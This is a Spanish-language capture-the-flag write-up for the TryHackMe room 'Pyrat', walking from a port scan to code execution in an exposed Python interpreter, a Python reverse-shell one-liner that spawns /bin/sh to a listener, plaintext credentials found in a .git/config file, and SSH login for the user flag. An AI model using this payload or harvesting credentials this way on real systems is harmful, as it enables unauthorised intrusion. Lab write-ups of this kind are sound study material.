# Pyrat - TryHackMe
## CTF Context : 
Pyrat receives a curious response from an server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

## Step 1 : Recognizion 
primero ejecuto un escaneo de puertos con el comando : 
`nmap -Pn -sV 10.64.189.210`
como resultado se pueden ver 2 puertos abiertos : 
```PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```
Como aun no tengo credenciales de SSH, intentare conectarme al puerto 8000 con netcat. 


## Step 2 : Establish conection

`nc -v 10.64.189.210 8000`
` 10.64.189.210: inverse host lookup failed: Unknown host
(UNKNOWN) [10.64.189.210] 8000 (?) open `

una vez dentro de netcat, intento correor comandos de linux como whoami, pero me devuelve name 'whoami' is not defined, como estamos en un interprete de python, intentare ejecutar codigo de python para ver si me devuelve alguna respuesta

print("prueba")
prueba

la prueba fue exitosa, como el interprete esta dentro de un servidor de Ubuntu, intentare correr comandos de linux desde la libreria os para ver que usuario soy

import os;print(os.getuid())
33

## Step 4 : Reverse shell
al parecer estamos dentro de un servidor web, intentare crear una reverse shell para estar mas comodo 

primero pongo a mi maquina a escuhar 
nc -lvnp 443
listening on [any] 443 ...

y inserto el payload 

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.64.189.210",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])

ahora tengo acceso a la shell 

└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.140.193] from (UNKNOWN) [10.64.189.210] 46
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/root

luego de navegar sobre las carpetas del directorio raiz, encontre una carpeta en /opt/dev, no ocntenia nada aprevia vista asi que use -ls -la

ls -la$ 
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git


al entrar a al carpeta, habia un arrlchivo llamado config, donde mostraba las credenciales del usuario think 

$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_
$ 

## Step 5 SSH login 

ahora que tengo las credneciales entre con ssh a think  

ssh think@<IP>
think@ip-10-64-189-210:~$ ls
snap  user.txt

encontre la bandera de user en user.txt





